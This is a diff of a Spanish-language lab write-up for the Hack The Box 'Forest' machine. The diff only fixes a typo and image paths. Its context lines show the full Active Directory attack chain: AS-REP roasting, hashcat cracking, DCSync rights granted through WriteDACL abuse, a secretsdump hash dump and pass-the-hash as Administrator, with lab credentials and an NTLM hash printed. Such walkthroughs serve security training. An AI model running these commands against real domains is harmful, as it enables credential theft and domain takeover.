@@ -15,11 +15,11 @@ layout:
 
 # Forest
 
-`Foreset` en un controlador de dominio de Windows (DC) de dificultad fácil, para un dominio en el que se ha instalado `Exchange Server`. Se descubre que el DC permite enlaces `LDAP` anónimos, que se utilizan para enumerar objetos de dominio. La contraseña de una cuenta de servicio con la autenticación previa `Kerberos` deshabilitada se puede descifrar para obtener un punto de apoyo.
+`Forest` en un controlador de dominio de Windows (DC) de dificultad fácil, para un dominio en el que se ha instalado `Exchange Server`. Se descubre que el DC permite enlaces `LDAP` anónimos, que se utilizan para enumerar objetos de dominio. La contraseña de una cuenta de servicio con la autenticación previa `Kerberos` deshabilitada se puede descifrar para obtener un punto de apoyo.
 
 Se descubre que la cuenta de servicio es miembro del grupo Operadores de cuenta, que se puede utilizar para agregar usuarios a grupos privilegiados de `Exchange`. La pertenencia al grupo de `Exchange` se aprovecha para obtener privilegios de `DCSync` en el dominio y volcar los `hashes NTLM`.
 
-<figure><img src="../../../../../.gitbook/assets/Forest.png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/Forest.png" alt="" width="563"><figcaption></figcaption></figure>
 
 ## Reconnaissance
 
@@ -29,7 +29,7 @@ Realizaremos un reconocimiento sobre la máquina Forest para encontrar puertos a
 nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.161 -oG allPorts
 ```
 
-<figure><img src="../../../../../.gitbook/assets/723_vmware_drnJfuBD2w.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/723_vmware_drnJfuBD2w.png" alt=""><figcaption></figcaption></figure>
 
 Lanzaremos unos scripts básicos para ver si encontramos alguna vulnerabilidad en los puertos expuestos.
 
@@ -39,7 +39,7 @@ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/724_vmware_XrbATaImTe.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/724_vmware_XrbATaImTe.png" alt=""><figcaption></figcaption></figure>
 
 Comprobaremos el nombre del dominio a través del siguiente comando.
 
@@ -47,7 +47,7 @@ Comprobaremos el nombre del dominio a través del siguiente comando.
 ldapsearch -x -H ldap://10.10.10.161 -s base | grep defaultNamingContext
 ```
 
-<figure><img src="../../../../../.gitbook/assets/725_vmware_8wilgq4giw.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/725_vmware_8wilgq4giw.png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a añadir la línea del dominio en el archivo **/etc/hosts** con su respectiva dirección IP.
 
@@ -55,7 +55,7 @@ Procederemos a añadir la línea del dominio en el archivo **/etc/hosts** con su
 catnp /etc/hosts | grep htb.local
 ```
 
-<figure><img src="../../../../../.gitbook/assets/726_vmware_HOQ7uEuw8K.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/726_vmware_HOQ7uEuw8K.png" alt=""><figcaption></figcaption></figure>
 
 ## RPC Enumeration - Getting valid domain users
 
@@ -71,7 +71,7 @@ catnp users
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/729_vmware_Fofsg9k3VG.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/729_vmware_Fofsg9k3VG.png" alt=""><figcaption></figcaption></figure>
 
 ## Perform an AS-RepRoast attack with the obtained users
 
@@ -85,7 +85,7 @@ impacket-GetNPUsers -no-pass -usersfile users htb.local/ 2>/dev/null
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/730_vmware_uwT5vEixIZ.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/730_vmware_uwT5vEixIZ.png" alt=""><figcaption></figcaption></figure>
 
 ## Cracking hashes with Hashcat
 
@@ -95,7 +95,7 @@ Nos guardaremos el hash en un archivo llamado "hash.txt"
 catnp hash.txt
 ```
 
-<figure><img src="../../../../../.gitbook/assets/731_vmware_c9z2LMmfJ7.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/731_vmware_c9z2LMmfJ7.png" alt=""><figcaption></figcaption></figure>
 
 Con el uso de la herramienta de **hashcat** realizaremosataque de fuerza bruta para obtener la contraseña a través de un diccionario, como rockyou. Finalmente obtenemos que la contraseña para el usuario "svc-alfresco" es "s3rvice".
 
@@ -103,7 +103,7 @@ Con el uso de la herramienta de **hashcat** realizaremosataque de fuerza bruta p
 hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../../../../../.gitbook/assets/732_vmware_ofd245moEk.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/732_vmware_ofd245moEk.png" alt=""><figcaption></figcaption></figure>
 
 ## Flag user.txt
 
@@ -113,7 +113,7 @@ Procederemos a comprobar que con dichas credenciales podemos acceder al WinRIM q
 netexec winrm 10.10.10.161 -u svc-alfresco -p 's3rvice'
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a conectarnos mediante **evil-winrm** y con las credenciales encontradas, comprobamos la flag de **user.txt**.
 
@@ -121,7 +121,7 @@ Procederemos a conectarnos mediante **evil-winrm** y con las credenciales encont
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
 ```
 
-<figure><img src="../../../../../.gitbook/assets/733_vmware_3PG2S2pG7m.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/733_vmware_3PG2S2pG7m.png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -135,7 +135,7 @@ upload SharpHound.exe
 ./SharpHound.exe --CollectionMethods All
 ```
 
-<figure><img src="../../../../../.gitbook/assets/739_vmware_B3kgvJkw6V.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/739_vmware_B3kgvJkw6V.png" alt=""><figcaption></figcaption></figure>
 
 El .zip que nos genere, nos lo descargaremos a nuestra Kali.
 
@@ -143,7 +143,7 @@ El .zip que nos genere, nos lo descargaremos a nuestra Kali.
 download 20241026170412_BloodHound.zip
 ```
 
-<figure><img src="../../../../../.gitbook/assets/740_vmware_z9fV1U5zLT.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/740_vmware_z9fV1U5zLT.png" alt=""><figcaption></figcaption></figure>
 
 ### Finding an attack vector in BloodHound
 
@@ -153,7 +153,7 @@ Con el permiso GenericAll, tenemos todos los derechos sobre el objeto de destino
 
 Además, el grupo “Exchange Windows Permissions” tiene permiso WriteDACL en el dominio (htb.local). Esto significa que si creamos un usuario y lo agregamos al grupo “Exchange Windows Permissions”, podríamos darle derechos de acceso DCSync y volcar los hashes de contraseña del controlador de dominio.
 
-<figure><img src="../../../../../.gitbook/assets/htb_forest_bloodhound_02.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/htb_forest_bloodhound_02.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing Account Operators Group - Creating a new user
 
@@ -165,7 +165,7 @@ net user jr Password01! /add /domain
 net group "Exchange Windows Permissions" jr /add
 ```
 
-<figure><img src="../../../../../.gitbook/assets/842_vmware_awXhH0eTa3.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/842_vmware_awXhH0eTa3.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing Account Operators Group - Assigning a group to the newly created user
 
@@ -173,7 +173,7 @@ net group "Exchange Windows Permissions" jr /add
 net localgroup "Remote Management Users" jr /add
 ```
 
-<figure><img src="../../../../../.gitbook/assets/843_vmware_fRM8MCczaC.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/843_vmware_fRM8MCczaC.png" alt=""><figcaption></figcaption></figure>
 
 Comprobaremos que el usuario se ha creado correctamente y las credenciales funcionan sin problemas.
 
@@ -181,7 +181,7 @@ Comprobaremos que el usuario se ha creado correctamente y las credenciales funci
 netexec smb 10.10.10.161 -u jr -p 'Password01!' -d htb.local
 ```
 
-<figure><img src="../../../../../.gitbook/assets/844_vmware_re26RpA4yA.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/844_vmware_re26RpA4yA.png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing WriteDacl in the domain - Granting DCSync Privileges
 
@@ -197,7 +197,7 @@ Import-Module .\PowerView.ps1
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/887_vmware_BloAbjIfhj.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/887_vmware_BloAbjIfhj.png" alt=""><figcaption></figcaption></figure>
 
 Estos comandos le otorga al usuario **jr** el derecho DCSync en el controlador de dominio htb.local, lo que le permite replicar la base de datos del dominio y obtener hashes de contraseñas de otros usuarios.
 
@@ -211,7 +211,7 @@ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -Princip
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/888_vmware_pOPOEiDj4l.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/888_vmware_pOPOEiDj4l.png" alt=""><figcaption></figcaption></figure>
 
 ### DCSync Exploitation - Secretsdump.py
 
@@ -221,7 +221,7 @@ Utilizaremos la herramienta de **secretsdump** para bolcar toda la información 
 secretsdump.py -just-dc  htb.local/jr@10.10.10.161
 ```
 
-<figure><img src="../../../../../.gitbook/assets/889_vmware_1qixfTCcS5.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/889_vmware_1qixfTCcS5.png" alt=""><figcaption></figcaption></figure>
 
 ### PassTheHash
 
@@ -233,7 +233,7 @@ Comprobamos que nos aparece como **Pwn3d** lo que indica que podemos conectarnos
 netexec winrm 10.10.10.161 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
-<figure><img src="../../../../../.gitbook/assets/891_vmware_iASr06zy9M.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/891_vmware_iASr06zy9M.png" alt=""><figcaption></figcaption></figure>
 
 Procederemos a conectarnos haciendo **PassTheHash** con el usuario "Administrator" y su respectivo hash y comprobamos que podemos acceder y revisar la flag de **root.txt**.
 
@@ -241,4 +241,4 @@ Procederemos a conectarnos haciendo **PassTheHash** con el usuario "Administrato
 evil-winrm -i 10.10.10.161 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
 
-<figure><img src="../../../../../.gitbook/assets/890_vmware_yIoV9aPPg5.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/890_vmware_yIoV9aPPg5.png" alt=""><figcaption></figcaption></figure>
